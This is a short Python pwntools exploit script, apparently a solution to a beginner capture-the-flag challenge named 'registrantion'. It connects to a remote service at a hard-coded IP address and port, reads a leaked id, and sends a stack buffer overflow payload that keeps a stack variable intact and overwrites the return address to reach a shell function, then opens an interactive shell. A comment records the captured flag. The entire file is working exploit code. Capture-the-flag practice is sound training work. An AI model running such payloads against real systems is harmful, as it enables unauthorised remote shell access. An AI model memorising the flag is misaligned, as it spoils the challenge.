from pwn import *
#context.log_level = 'DEBUG'


p = remote('140.110.112.217', 6128)

#p = process('./registrantion')

p.recvline()
id = p.recvuntil(b':')
id = int(p.recvline().strip(b'\n').decode())
p.recvuntil(b':')
#gdb.attach(p, gdbscript=('b *0x004008df\n'))
offset = b'A' * 28
id = pack(id, 32, 'little')
shell = pack(0x004007d6, 64, 'little')
payload = offset + id + b'A'*8 +shell
p.sendline(payload)
p.recvuntil(b':')
p.sendline(b'a')
p.interactive()
#MyFirstCTF{B3_c4r3FuL_0f_l0cAl_V4rI4b13_0N_sT4ck_OwO}